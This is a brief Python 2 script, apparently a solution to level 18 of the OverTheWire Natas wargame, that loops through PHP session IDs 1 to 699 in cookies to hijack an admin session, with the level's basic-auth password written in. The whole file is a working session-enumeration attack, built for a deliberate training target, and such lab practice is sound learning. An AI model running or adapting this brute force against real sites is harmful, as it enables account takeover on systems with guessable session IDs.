#!/usr/bin/python

import requests


username = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
auth = (username, password)

url = "http://natas18.natas.labs.overthewire.org/"
data = {'username' : 'admin', 'password' : '1234'}

for i in range(1, 700):

	cookie = {'PHPSESSID' : '{}' .format(i)}
	req = requests.post(url, auth = auth, data = data, cookies = cookie)

	if "You are logged in as a regular user" not in req.text :
		print req.text
		break
	else:
		print "faild for user {}" .format(i)


